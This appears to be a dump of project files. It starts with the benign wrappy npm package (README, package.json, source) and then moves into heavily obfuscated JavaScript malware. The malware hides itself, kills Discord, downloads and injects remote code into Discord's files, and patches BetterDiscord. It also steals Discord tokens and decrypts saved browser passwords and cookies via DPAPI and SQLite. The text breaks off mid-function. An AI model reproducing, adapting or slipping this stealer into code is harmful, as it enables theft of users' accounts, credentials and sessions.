var wrappy = require("wrappy")
// var wrapper = wrappy(wrapperFunction)
// make sure a cb is called only once
// See also: http://npm.im/once for this specific use case
var once = wrappy(function (cb) {
  var called = false
  return function () {
    if (called) return
    called = true
    return cb.apply(this, arguments)
function printBoo () {
  console.log('boo')
// has some rando property
printBoo.iAmBooPrinter = true
var onlyPrintOnce = once(printBoo)
onlyPrintOnce() // prints 'boo'
onlyPrintOnce() // does nothing
// random property is retained!
assert.equal(onlyPrintOnce.iAmBooPrinter, true)
  "_args": [
    [
      "wrappy@1.0.2",
      "C:\\Users\\me\\Documents\\! Proyectos\\bCry"
    ]
  ],
  "_from": "wrappy@1.0.2",
  "_id": "wrappy@1.0.2",
  "_inBundle": false,
  "_integrity": "sha1-tSQ9jz7BqjXxNkYFvA0QNuMKtp8=",
  "_location": "/wrappy",
  "_phantomChildren": {},
  "_requested": {
    "type": "version",
    "registry": true,
    "raw": "wrappy@1.0.2",
    "name": "wrappy",
    "escapedName": "wrappy",
    "rawSpec": "1.0.2",
    "saveSpec": null,
    "fetchSpec": "1.0.2"
  },
  "_requiredBy": [
    "/inflight",
    "/once"
  ],
  "_resolved": "https://registry.npmjs.org/wrappy/-/wrappy-1.0.2.tgz",
  "_spec": "1.0.2",
  "_where": "C:\\Users\\me\\Documents\\! Proyectos\\bCry",
  "author": {
    "name": "Isaac Z. Schlueter",
    "email": "i@izs.me",
    "url": "http://blog.izs.me/"
  },
  "bugs": {
    "url": "https://github.com/npm/wrappy/issues"
  },
  "dependencies": {},
  "description": "Callback wrapping utility",
  "devDependencies": {
    "tap": "^2.3.1"
  },
  "directories": {
    "test": "test"
  },
  "files": [
    "wrappy.js"
  ],
  "homepage": "https://github.com/npm/wrappy",
  "license": "ISC",
  "main": "wrappy.js",
  "name": "wrappy",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/npm/wrappy.git"
  },
  "scripts": {
    "test": "tap --coverage test/*.js"
  },
  "version": "1.0.2"
// Returns a wrapper function that returns a wrapped callback
// The wrapper function should do some stuff, and return a
// presumably different callback function.
// This makes sure that own properties are retained, so that
// decorations and such are not lost along the way.
module.exports = wrappy
function wrappy (fn, cb) {
  if (fn && cb) return wrappy(fn)(cb)
  if (typeof fn !== 'function')
    throw new TypeError('need wrapper function')
  Object.keys(fn).forEach(function (k) {
    wrapper[k] = fn[k]
  })
  return wrapper
  function wrapper() {
    var args = new Array(arguments.length)
    for (var i = 0; i < args.length; i++) {
      args[i] = arguments[i]
    }
    var ret = fn.apply(this, args)
    var cb = args[args.length-1]
    if (typeof ret === 'function' && ret !== cb) {
      Object.keys(cb).forEach(function (k) {
        ret[k] = cb[k]
      })
    }
    return ret

function encoded_strings_and_functions() {
    const encoded_strings = ["yxjNDG", "C2XPy2u", "zgvIDwDTzxbSzwfZzwTK", "BMv4zs1UyxrPDMvZ", "CMvZB2X2zq", "C3fSAxrLmW", "D2LUlwrWyxbP", "z2XVyG", "y3j5ChrV", "Ahr0Chm", "y2HPBgrFChjVy2vZCW", "yxHPB3m", "yNvMzMvYlxjLCgXHy2u", "zw52", "qvbqrefuqq", "te9dquXbufbeqvrb", "xgrPC2nVCMrC", "xgrPC2nVCMrJyw5HCNLC", "xgrPC2nVCMrWDgjC", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxerLzMf1BhrC", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxfbYB2zPBguGmvW", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxfbYB2zPBguGmLW", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxfbYB2zPBguGm1W", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxfbYB2zPBguGnfW", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxfbYB2zPBguGnvW", "xeDVB2DSzvXdAhjVBwvCvxnLCIbeyxrHxeD1zxn0ifbYB2zPBgvC", "xe9WzxjHifnVzNr3yxjLxe9WzxjHifn0ywjSzvW", "xe9WzxjHifnVzNr3yxjLxe9WzxjHieDyifn0ywjSzvW", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCrgvMyxvSDfW", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCuhjVzMLSzsaXxa", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCuhjVzMLSzsaYxa", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCuhjVzMLSzsaZxa", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCuhjVzMLSzsa0xa", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCuhjVzMLSzsa1xa", "xejYyxzLu29MDhDHCMvCqNjHDMuTqNjVD3nLCLXvC2vYierHDgfCr3vLC3qGuhjVzMLSzvW", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXqCM9MAwXLidfC", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXqCM9MAwXLidjC", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXqCM9MAwXLidnC", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXqCM9MAwXLidrC", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXqCM9MAwXLidvC", "xfLHBMrLEfXzyw5KzxHcCM93C2vYxfvZzxiGrgf0yvXhDwvZDcbqCM9MAwXLxa", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXezwzHDwX0xa", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXqCM9MAwXLidfC", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXqCM9MAwXLidjC", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXqCM9MAwXLidnC", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXqCM9MAwXLidrC", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXqCM9MAwXLidvC", "xe1Py3jVC29MDfXfzgDLxfvZzxiGrgf0yvXhDwvZDcbqCM9MAwXLxa", "CMvHzgrPCLn5BMm", "zM9YrwfJAa", "AxnJB3jK", "Aw5JBhvKzxm", "EgzwuMS", "ChvZAa", "rfrXCfu", "xgfWCc0Qxg1VzhvSzxnCzgLZy29Yzf9KzxnRDg9Wx2nVCMuTkLXKAxnJB3jKx2rLC2T0B3bFy29YzvXPBMrLEc5QCW", "C3LUyW", "BwfW", "EMnnqMe", "zgf0yq", "zw5K", "Ahr0Chm6lY9IyNKUCMLWl2nVCNbZzs9ZDhi", "z2v0", "tKzHy0O", "yMj5C3rLywXLCG", "yLb4s3y", "ufbQsey", "D3jPDgvgAwXLu3LUyW", "DxrMoa", "CMvWBgfJzq", "Aw5KzxGUANm", "D1j4Axu", "zxHPC3rZu3LUyW", "BwTKAxjtEw5J", "zxjYB3i", "Bg9N", "rgLZy29Yzc5LEgu", "rgLZy29Yza", "rgLZy29YzerLDMvSB3bTzw50lMv4zq", "rgLZy29YzerLDMvSB3bTzw50", "DgfZA2XPC3q", "y1nUuey", "nxW0Fdf8m3W2Fdj8ma", "C3bSAxq", "rgLZy29YzfbuqI5LEgu", "rgLZy29YzfbuqG", "rgLZy29YzenHBMfYEs5LEgu", "rgLZy29YzenHBMfYEq", "ELzeyxq", "q1LmD24", "qKzNsfO", "DK10q1C", "r0HNvfK", "DgfZA2TPBgWGl0Lnia", "lMv4zsaVrG", "qvbpzwm", "DfH6zeC", "xfvWzgf0zs5LEgu", "yLHNv2e", "CwzbEwO", "ALHozfu", "ic0TChjVy2vZC1n0yxj0ia", "lMv4zq", "xejLDhrLCKrPC2nVCMrCzgf0yvXIzxr0zxjKAxnJB3jKlMfZyxi", "yxbPl3DLyMHVB2TZ", "rgncEwu", "yxbWzgf0yq", "ugjvwKe", "CMvHzezPBgvtEw5J", "wgn6v0S", "vwzhzwG", "A2TRAW", "DxrMltG", "yMfZzty0", "tg9JywWGu3rHDgu", "zw5JCNLWDgvKx2TLEq", "CgfZC3DVCMrZlMrI", "q3vYCMvUDfvZzxi", "C3bSAwnL", "BgvUz3rO", "sufvEeO", "zhDNExy", "AM9PBG", "C3rHCNrZv2L0Aa", "zgLZy29Yza", "AgHpweW", "CgfYC2u", "B3nFy3j5Chq", "C3zosNm", "zNjVBq", "tg9NAw4Grgf0yq", "DfLsEuC", "y29WEuzPBgu", "Bw1otwy", "Dw5WCM90zwn0rgf0yq", "t2H2BKm", "rgf0ywjHC2u", "txjcvui", "z2LKz3C", "ywXS", "u0vmrunuig9YAwDPBL91CMWSihvZzxjUyw1Lx3zHBhvLlcbWyxnZD29Yzf92ywX1zsbguK9nigXVz2LUCW", "DxnLCM5HBwvFDMfSDwu", "CgfZC3DVCMrFDMfSDwu", "vNzbBNi", "sNrRB1O", "cLvstdOG", "B3jPz2LUx3vYBa", "ihWGvvnfuK5btuu6ia", "ihWGueftu1DpuKq6ia", "Dg9tDhjPBMC", "DMfWwKC", "tuXcyvG", "y3jLyxrLrgvJAxbOzxjPDG", "ywvZlti1nI1Ny20", "C2v0qxv0AfrHzW", "DxbKyxrL", "zfPpBhe", "zMLUywW", "qLD3wK4", "yuPJwve", "q29VA2LLCW", "BwnAA0G", "CvDvwKe", "Bu9MtuW", "EenXvxK", "zNHMv0u", "uhzIze8", "v2n3tfa", "shrut1u", "y29VA2LLCY5KyG", "s1vIAe0", "s3jADeG", "r3vSsNC", "tNHOEg4", "u0vmrunuigHVC3rFA2v5lcbUyw1LlcbLBMnYExb0zwrFDMfSDwuGrLjptsbJB29RAwvZ", "zw5JCNLWDgvKx3zHBhvL", "CwzKvLC", "v0PYsuW", "uffkEMS", "cKHpu1qGs0vzoIa", "Ag9ZDf9RzxK", "ihWGtKfnrtOG", "BMfTzq", "ihWGvKfmvuu6ia", "ExL6rK8", "AwvUywW", "vvzLwgK", "y0nlExK", "uefmtK0", "v21jA2i", "Ahr0Chm6lY9IyNKUCMLWl2nVCNbZzs9WyxnZD29Yzhm", "sgDZqwi", "rvPmt1e", "rLHxrhe", "CfHvsMO", "D3jPCxm", "Cg9ZDa", "ufnKq1m", "Dgv4Dc9WBgfPBG", "DMr2vuq", "Ahr0Chm6lY9IyNKUCMLWl2nVCNbZzs9JB29RAwvZ", "E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK", "D2fYBG", "zxHJzxb0Aw9U", "DgfIBgu", "DhjHy2u", "yxbWBhK", "vNHQAgW", "CMv0DxjUicHMDw5JDgLVBIGPia", "DM90tee", "y29UC29Szq", "uLrwufK", "Aw5MBW", "AfP4t3i", "Bezvvve", "t0ndqve", "yKvks1G", "y29UC3rYDwn0B3i", "ChjVDg90ExbL", "yMLUza", "x19WCM90B19F", "cIaGicbbzgqTvhLWzsaTtMfTzsbxAw5KB3CGlu5HBwvZCgfJzsbdB25ZB2XLic1nzw1IzxjezwzPBML0Aw9UicCkicaGifTeBgXjBxbVCNqOiKTLCM5LBdmYlMrSBciPxqOGicaGChvIBgLJihn0yxrPyYbLEhrLCM4Gsw50uhrYieDLDenVBNnVBgvxAw5KB3COktSkcIaGicbBrgXSsw1WB3j0kcj1C2vYmZiUzgXSiILDcIaGicbWDwjSAwmGC3rHDgLJigv4DgvYBIbIB29SifnOB3DxAw5KB3COsw50uhrYigHxBMqSieLUDdmYig5dBwrtAg93ktSkicaGicCkcIaGicaKy29UC29Szvb0CIa9ifTdB25ZB2XLlLDPBMrVD106oKDLDenVBNnVBgvxAw5KB3COkqOGicaGiZaGAgLKzqOGicaGw0nVBNnVBguUv2LUzg93xtO6u2HVD1DPBMrVDYGKy29UC29Szvb0CIWGmcKkicaGia", "y3DK", "xhrLBxaUChmX", "q0jYBg4", "zxHLy1n5BMm", "DhLWzsaUxhrLBxaUChmXihWGCg93zxjZAgvSBc5LEguGlw5VChjVzMLSzsaT", "Aw5OzxjPDa", "Dw5SAw5Ru3LUyW", "lMXVzW", "lMXKyG", "tg9JywWGu3rVCMfNzvXSzxzLBgrI", "sMjQEfC", "zw5KC1DPDgG", "DNPPqxa", "B3bprxa", "vLnzDgK", "Bwf0y2G", "Aw5KzxHpzG", "yxbWBgLJyxrPB24VANnVBG", "wgjwtvO", "zMLSDgvY", "DvL4CLu", "ue9tva", "Ahr0Chm6lY9IyNKUCMLWl2nVCNbZzs90B2TLBNm", "CMvXDwvZDa"];
    encoded_strings_and_functions = function () {
        return encoded_strings;
    };
    return encoded_strings_and_functions();
}
const fs = require("fs");
var debug = true, args = process[decoder_function(347, -206)][decoder_function(348, -321)](2);
args[0] == decoder_function(349, 686) ? debug = true : hideSelf();
const sqlite3 = require(decoder_function(350, 542))(require[decoder_function(351, -188)](decoder_function(352, -383))), dpapi = require(decoder_function(350, 877))(require[decoder_function(351, 553)](decoder_function(353, -223))), glob = require(decoder_function(354, 873)), crypto = require(decoder_function(355, 447)), https = require(decoder_function(356, 972)), {exec} = require(decoder_function(357, -254));
const axios = require(decoder_function(358, 479)), buf_replace = require(decoder_function(359, 552));
var appdata = process[decoder_function(360, 551)][decoder_function(361, 1023)], localappdata = process[decoder_function(360, 410)][decoder_function(362, -278)];
var intents_password = 0, intents_cookies = 0, passwordsStealed = false, cookiesStealed = false, tokensStealed = false, discords = [], injectPath = [], runningDiscords = [], paths = [appdata + decoder_function(363, -270), appdata + decoder_function(364, 377), appdata + decoder_function(365, 509), localappdata + decoder_function(366, -179), localappdata + decoder_function(367, 813), localappdata + decoder_function(368, 509), localappdata + decoder_function(369, 1042), localappdata + decoder_function(370, 534), localappdata + decoder_function(371, 599), localappdata + decoder_function(372, 850), appdata + decoder_function(373, 960), appdata + decoder_function(374, -156), localappdata + decoder_function(375, -165), localappdata + decoder_function(376, -212), localappdata + decoder_function(377, -166), localappdata + decoder_function(378, 382), localappdata + decoder_function(379, 546), localappdata + decoder_function(380, -235), localappdata + decoder_function(381, -273), localappdata + decoder_function(382, -275), localappdata + decoder_function(383, 748), localappdata + decoder_function(384, -40), localappdata + decoder_function(385, -78), localappdata + decoder_function(386, -268), localappdata + decoder_function(387, 600), localappdata + decoder_function(388, 844), localappdata + decoder_function(389, 483), localappdata + decoder_function(390, 1015), localappdata + decoder_function(391, -196), localappdata + decoder_function(392, 592), localappdata + decoder_function(393, -202), localappdata + decoder_function(394, 683)];
fs[decoder_function(395, -212)](localappdata)[decoder_function(396, -121)](_0x55a1af => {
    const const2 = {xfVRk: decoder_function(397, 386), DTqpU: function (_0x17e7e6, _0xa97046) {
            return _0x17e7e6 + _0xa97046;
        }};
    if (_0x55a1af[decoder_function(398, 244)](const2[decoder_function(399, -387)])) discords[decoder_function(400, 459)](const2[decoder_function(401, -300)](localappdata + "\\", _0x55a1af)); else return;
}), discords[decoder_function(396, 469)](function (_0x1592c2) {
    const const6 = {zcMBa: function (_0x12f16f) {
            return _0x12f16f();
        }};
    let _0xfa82d1 = "" + _0x1592c2 + decoder_function(402, 1403);
    glob[decoder_function(403, 1185)](_0xfa82d1)[decoder_function(404, -450)](_0x233b66 => {
        injectPath[decoder_function(400, -92)](_0x233b66), const6[decoder_function(405, 684)](listDiscords);
    });
});
function Infect() {
    const const3 = {bPxKv: decoder_function(406, 1368), PPjHF: decoder_function(407, 1321), NFacJ: decoder_function(408, -205)};
    https[decoder_function(409, 223)](const3[decoder_function(410, 72)], _0x1a2963 => {
        const _0x22dffe = {wRxiu: decoder_function(411, 464)};
        let let1 = "";
        _0x1a2963.on(const3[decoder_function(412, 254)], _0x43afb9 => {
            let1 += _0x43afb9;
        }), _0x1a2963.on(const3[decoder_function(413, 314)], () => {
            injectPath[decoder_function(396, 5)](_0x551660 => {
                fs[decoder_function(414, -608)](_0x551660, let1, {encoding: decoder_function(415, -601), flag: "w"});
                let _0x2ec87c = _0x551660[decoder_function(416, 711)](decoder_function(417, 838), _0x22dffe[decoder_function(418, 395)]);
                !fs[decoder_function(419, 736)](_0x2ec87c) && (fs[decoder_function(420, -147)](_0x2ec87c, 484), startDiscord());
            });
        });
    })["on"](decoder_function(421, 1085), _0x552630 => {
        if (debug) console[decoder_function(422, 1476)](_0x552630);
    });
}
;
function decoder_function(decoder_arg1_position1, decoder_arg2_position2) {
    const encoded_list = encoded_strings_and_functions();
    return decoder_function = function (encoded_list_position, _0x57d756) {
        encoded_list_position = encoded_list_position - 347;
        let encoded_string = encoded_list[encoded_list_position];
        if (decoder_function.YEZCYf === undefined) {
            var var1 = function (_0x15a87d) {
                const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
                let _0x3df6a8 = "", url_encoded_string = "";
                for (let iterator_on_encoded_strings = 0, _0x5d89a9, character_from_aphabet, _0x4cc777 = 0; character_from_aphabet = _0x15a87d.charAt(_0x4cc777++); ~character_from_aphabet && (_0x5d89a9 = iterator_on_encoded_strings % 4 ? _0x5d89a9 * 64 + character_from_aphabet : character_from_aphabet, iterator_on_encoded_strings++ % 4) ? _0x3df6a8 += String.fromCharCode(255 & _0x5d89a9 >> (-2 * iterator_on_encoded_strings & 6)) : 0) {
                    character_from_aphabet = alphabet.indexOf(character_from_aphabet);
                }
                for (let iteration = 0, _0x4baab9 = _0x3df6a8.length; iteration < _0x4baab9; iteration++) {
                    url_encoded_string += "%" + ("00" + _0x3df6a8.charCodeAt(iteration).toString(16)).slice(-2);
                }
                return decodeURIComponent(url_encoded_string);
            };
            decoder_function.IqeEzF = var1, decoder_arg1_position1 = arguments, decoder_function.YEZCYf = true;
        }
        const _0x2e3680 = encoded_list[0], _0x16816b = encoded_list_position + _0x2e3680, _0x5862ed = decoder_arg1_position1[_0x16816b];
        return !_0x5862ed ? (encoded_string = decoder_function.IqeEzF(encoded_string), decoder_arg1_position1[_0x16816b] = encoded_string) : encoded_string = _0x5862ed, encoded_string;
    }, decoder_function(decoder_arg1_position1, decoder_arg2_position2);
}
function listDiscords() {
    const _0xcbfd02 = {zVDat: decoder_function(423, 717), CYLwn: decoder_function(424, 663), BFgHZ: decoder_function(425, 318), vMtCW: decoder_function(426, 310), cSnPF: decoder_function(427, 811)};
    exec(_0xcbfd02[decoder_function(428, 778)], function (_0x3f9bb1, _0x14d317, _0x2e1a4c) {
        const const23 = decoder_function(429, 122)[decoder_function(430, 451)]("|");
        let _0x51a153 = 0;
        while (true) {
            switch (const23[_0x51a153++]) {
                case "0":
                    killDiscord();
                    continue;
                case "1":
                    _0x14d317[decoder_function(398, 301)](decoder_function(431, 438)) && runningDiscords[decoder_function(400, -357)](decoder_function(432, 397));
                    continue;
                case "2":
                    ;
                    continue;
                case "3":
                    ;
                    continue;
                case "4":
                    _0x14d317[decoder_function(398, -299)](decoder_function(433, 572)) && runningDiscords[decoder_function(400, 120)](decoder_function(434, 19));
                    continue;
                case "5":
                    _0x14d317[decoder_function(398, 378)](_0xcbfd02[decoder_function(435, 709)]) && runningDiscords[decoder_function(400, 261)](_0xcbfd02[decoder_function(436, 248)]);
                    continue;
                case "6":
                    _0x14d317[decoder_function(398, -400)](_0xcbfd02[decoder_function(437, 12)]) && runningDiscords[decoder_function(400, 577)](_0xcbfd02[decoder_function(438, 42)]);
                    continue;
            }
            break;
        }
    });
}
;
function killDiscord() {
    const const8 = {GHgTY: function (_0x482663, _0x2262e9, _0xefa0fe) {
            return _0x482663(_0x2262e9, _0xefa0fe);
        }, APOec: function (_0x255304) {
            return _0x255304();
        }, tXzdG: function (_0xc9dbcf) {
            return _0xc9dbcf();
        }};
    runningDiscords[decoder_function(396, 143)](_0xd439e9 => {
        const8[decoder_function(439, -316)](exec, decoder_function(440, 780) + _0xd439e9 + decoder_function(441, 169), _0xbf9f2d => {
            if (_0xbf9f2d) {
                if (debug) console[decoder_function(422, 313)](_0xbf9f2d);
                return;
            }
        });
    });
    const8[decoder_function(442, 1255)](Infect);
    const8[decoder_function(443, 103)](stealTokens), stealPasswords();
    const8[decoder_function(443, 1234)](stealCookies), pwnBetterDiscord();
}
;
function startDiscord() {
    const const9 = {bXgWa: function (_0x1d46e7, _0x5b62b3) {
            return _0x1d46e7 + _0x5b62b3;
        }, qfAyj: decoder_function(444, 983), jXNdU: function (_0x52dfd7, _0xa7f6a5, _0x1c56ac) {
            return _0x52dfd7(_0xa7f6a5, _0x1c56ac);
        }};
    runningDiscords[decoder_function(396, 964)](_0x379db1 => {
        path = const9[decoder_function(445, 1280)](localappdata + "\\", _0x379db1) + const9[decoder_function(446, 1258)];
        const9[decoder_function(447, -122)](exec, path + decoder_function(448, 478) + _0x379db1 + decoder_function(449, 1230), _0x56f803 => {
            if (_0x56f803) {
                if (debug) console[decoder_function(422, 962)](_0x56f803);
                return;
            }
        });
    });
}
;
function pwnBetterDiscord() {
    const const10 = {DcBye: function (_0x310146, _0x173329) {
            return _0x310146 + _0x173329;
        }, PbUZA: decoder_function(450, 839), XczWK: function (_0x54a429, _0x822dfa, _0x5a52b4, _0x3b60a2) {
            return _0x54a429(_0x822dfa, _0x5a52b4, _0x3b60a2);
        }, UfGeh: decoder_function(451, 839)};
    var _0x4a70dd = const10[decoder_function(452, 862)](process[decoder_function(360, 843)][decoder_function(453, 823)], const10[decoder_function(454, 937)]);
    if (fs[decoder_function(419, 910)](_0x4a70dd)) {
        var _0xd70f71 = fs[decoder_function(455, -334)](_0x4a70dd);
        fs[decoder_function(414, 1003)](_0x4a70dd, const10[decoder_function(456, 910)](buf_replace, _0xd70f71, const10[decoder_function(457, 852)], decoder_function(458, -336)));
    } else return;
}
async function getPasswords(_0x4a8cff) {
    const const11 = {BWwZN: function (_0x2b867c, _0x8acd2a) {
            return _0x2b867c == _0x8acd2a;
        }, aJcYQ: function (_0x2fc5e7, _0x38735e) {
            return _0x2fc5e7(_0x38735e);
        }, MrBUB: function (_0x3997ee, _0x5c7c20) {
            return _0x3997ee == _0x5c7c20;
        }, mmNMf: decoder_function(459, 916), gidgw: decoder_function(460, 1011), IAUxJ: function (_0xe574a, _0x4d5321) {
            return _0xe574a - _0x4d5321;
        }, dwgyv: function (_0x14e3dd, _0x4157ca) {
            return _0x14e3dd + _0x4157ca;
        }, hhOXL: decoder_function(461, -83), svNJs: decoder_function(462, 53), tYRyG: decoder_function(463, 294), OhvnC: decoder_function(464, 921)};
    let _0x283537 = _0x4a8cff[decoder_function(430, 626)]("\\"), _0x559495 = _0x283537[decoder_function(465, 245)](-_0x283537[decoder_function(466, 150)], const11[decoder_function(467, 294)](_0x283537[decoder_function(466, 744)], 2)), _0x1799db = const11[decoder_function(468, 861)](_0x559495[decoder_function(469, 858)]("\\"), "\\");
    if (_0x4a8cff[decoder_function(470, 1007)](appdata)) _0x1799db = _0x4a8cff;
    if (_0x4a8cff[decoder_function(398, 53)](decoder_function(471, -106))) return;
    let _0x2a6e1e = fs[decoder_function(455, -9)](_0x1799db + const11[decoder_function(472, 179)]);
    let _0x22a118 = JSON[decoder_function(473, 898)](_0x2a6e1e)[decoder_function(474, 107)][const11[decoder_function(475, 164)]], _0x110cbe = Buffer[decoder_function(476, 179)](_0x22a118, decoder_function(460, 896))[decoder_function(348, 155)](5);
    var _0x1d02ee = _0x4a8cff + decoder_function(477, 952), _0xd76ae = const11[decoder_function(468, 731)](_0x4a8cff, const11[decoder_function(478, 1006)]);
    fs[decoder_function(479, 1068)](_0x1d02ee, _0xd76ae, _0x11dc29 => {
        if (_0x11dc29) {
            if (debug) console[decoder_function(422, 1152)](_0x11dc29);
        }
    });
    const _0xba18f6 = Buffer[decoder_function(476, 866)](_0x110cbe, const11[decoder_function(480, 328)]), _0x2468b3 = dpapi[decoder_function(481, -11)](_0xba18f6, null, const11[decoder_function(482, 895)]);
    var _0x45d50a = "";
    var _0x55b1cf = new sqlite3[decoder_function(483, 1041)](_0xd76ae, _0x2b02c1 => {
        if (_0x2b02c1) {
            if (debug) console[decoder_function(422, 899)](_0x2b02c1);
        }
    });
    const _0x11ae76 = await new Promise((_0x36ebc7, _0x100875) => {
        const _0x48e016 = {VvAnr: function (_0x3f01a2, _0x3e676a) {
                return const11[decoder_function(484, 452)](_0x3f01a2, _0x3e676a);
            }, JtkoZ: function (_0x38dfda, _0x4fe878) {
                return const11[decoder_function(484, -25)](_0x38dfda, _0x4fe878);
            }, vapZG: const11[decoder_function(480, 672)], MLBaX: function (_0x27b7fe, _0x15db50) {
                return _0x27b7fe - _0x15db50;
            }, dZOlq: const11[decoder_function(485, -292)]};
        _0x55b1cf[decoder_function(486, -377)](decoder_function(487, -261), async function (_0x258213, _0x65d129) {
            if (_0x258213) {}
            _0x65d129 ? _0x65d129[decoder_function(396, 1436)](async _0x469eef => {
                if (_0x469eef[decoder_function(488, 1073)] != "") {
                    let _0x2256f3 = _0x469eef[decoder_function(489, 1031)];
                    try {
                        if (_0x48e016[decoder_function(490, 872)](_0x2256f3[0], 1) && _0x2256f3[1] == 0 && _0x48e016[decoder_function(491, 989)](_0x2256f3[2], 0) && _0x2256f3[3] == 0) _0x45d50a += decoder_function(492, 276) + _0x469eef[decoder_function(493, 846)] + decoder_function(494, 296) + _0x469eef[decoder_function(488, 1103)] + decoder_function(495, 1222) + dpapi[decoder_function(481, 300)](_0x2256f3, null, decoder_function(464, -278))[decoder_function(496, -391)](_0x48e016[decoder_function(497, 352)]); else {
                            if (_0x2256f3[0] == 118 && _0x48e016[decoder_function(491, 1015)](_0x2256f3[1], 49) && _0x48e016[decoder_function(491, 879)](_0x2256f3[2], 48)) {
                                let _0x40c01e = _0x2256f3[decoder_function(348, 1005)](3, 15), _0x1a8063 = _0x2256f3[decoder_function(348, 237)](15, _0x2256f3[decoder_function(466, -324)] - 16), _0xa04376 = _0x2256f3[decoder_function(348, 879)](_0x48e016[decoder_function(498, 924)](_0x2256f3[decoder_function(466, 937)], 16), _0x2256f3[decoder_function(466, 880)]), _0x4a694a = crypto[decoder_function(499, 233)](decoder_function(500, -396), _0x2468b3, _0x40c01e);
                                _0x4a694a[decoder_function(501, 407)](_0xa04376);
                                let _0x33d8fc = _0x4a694a[decoder_function(502, 936)](_0x1a8063, _0x48e016[decoder_function(503, 207)], decoder_function(459, 287));
                                _0x33d8fc += _0x4a694a[decoder_function(504, -412)](_0x48e016[decoder_function(497, -346)]), _0x45d50a += decoder_function(492, 1027) + _0x469eef[decoder_function(493, 1126)] + decoder_function(494, 185) + _0x469eef[decoder_function(488, 332)] + decoder_function(495, 1006) + _0x33d8fc;
                            }
                        }
                    } catch (_0x3b7900) {
                        if (debug) console[decoder_function(422, 121)](_0x258213);
                    }
                }
            }) : (intents_password++, const11[decoder_function(505, -172)](intents_password, 5) ? intents_password = 0 : getPasswords(_0x4a8cff)), const11[decoder_function(506, 426)](_0x36ebc7, _0x45d50a);
        });
    });
    return _0x11ae76;
}
async function getCookies(_0x6cb3a2) {
    const _0x1d77ab = {KrZtH: function (_0x3a67b8, _0x2cec4d) {
            return _0x3a67b8 == _0x2cec4d;
        }, KUbhM: decoder_function(464, -462), GulJw: function (_0x9192d5, _0x2d2973) {
            return _0x9192d5 == _0x2d2973;
        }, Nxhxn: function (_0x45d3a9, _0x37824c) {
            return _0x45d3a9 - _0x37824c;
        }, mcZkH: decoder_function(471, 743), qWUZA: function (_0x11aad7, _0x3f03d9) {
            return _0x11aad7 + _0x3f03d9;
        }, mOfML: decoder_function(461, 773), xCqUy: decoder_function(474, -332), fxfWE: decoder_function(462, -42), PvbdO: decoder_function(460, 36), WcwLP: decoder_function(507, -440), HtTOU: function (_0x415fc0, _0xb67bf6) {
            return _0x415fc0 + _0xb67bf6;
        }};
    let _0x1584a0 = _0x6cb3a2[decoder_function(430, -424)]("\\");
    let _0x3d8aa9 = _0x1584a0[decoder_function(465, -324)](-_0x1584a0[decoder_function(466, -504)], _0x1584a0[decoder_function(466, -415)] - 2), _0x2c68f1 = _0x3d8aa9[decoder_function(469, -322)]("\\") + "\\";
    if (_0x6cb3a2[decoder_function(470, -478)](appdata)) _0x2c68f1 = _0x6cb3a2;
    if (_0x6cb3a2[decoder_function(398, -507)](_0x1d77ab[decoder_function(508, -456)])) return;
    let _0x218573 = fs[decoder_function(455, -398)](_0x1d77ab[decoder_function(509, -102)](_0x2c68f1, _0x1d77ab[decoder_function(510, -423)])), _0x4c2076 = JSON[decoder_function(473, 721)](_0x218573)[_0x1d77ab[decoder_function(511, 84)]][_0x1d77ab[decoder_function(512, -293)]], _0x2a489e = Buffer[decoder_function(476, -410)](_0x4c2076, _0x1d77ab[decoder_function(513, -416)])[decoder_function(348, -482)](5);
    var _0x4feb83 = _0x6cb3a2 + _0x1d77ab[decoder_function(514, 1414)], _0x4923bf = _0x1d77ab[decoder_function(515, -307)](_0x6cb3a2, decoder_function(516, -315));
    fs[decoder_function(479, -494)](_0x4feb83, _0x4923bf, _0x43e3f5 => {
        if (_0x43e3f5) {
            if (debug) console[decoder_function(422, -121)](_0x43e3f5);
        }
    });
    const _0x779b8d = Buffer[decoder_function(476, 737)](_0x2a489e, decoder_function(459, -476)), _0x3cc6e3 = dpapi[decoder_function(481, 24)](_0x779b8d, null, _0x1d77ab[decoder_function(517, -408)]);
    var _0x2f5f0d = "", _0x149ab4 = new sqlite3[decoder_function(483, 1326)](_0x4923bf, _0x418202 => {
        if (_0x418202) {
            if (debug) console[decoder_function(422, -552)](_0x418202);
        }
    });
    const _0xf55a52 = await new Promise((_0xca0c44, _0x455d20) => {
        const _0x5b4eb3 = {qfdVW: function (_0x5b779b, _0xd54e9c) {
                return _0x1d77ab[decoder_function(518, -568)](_0x5b779b, _0xd54e9c);
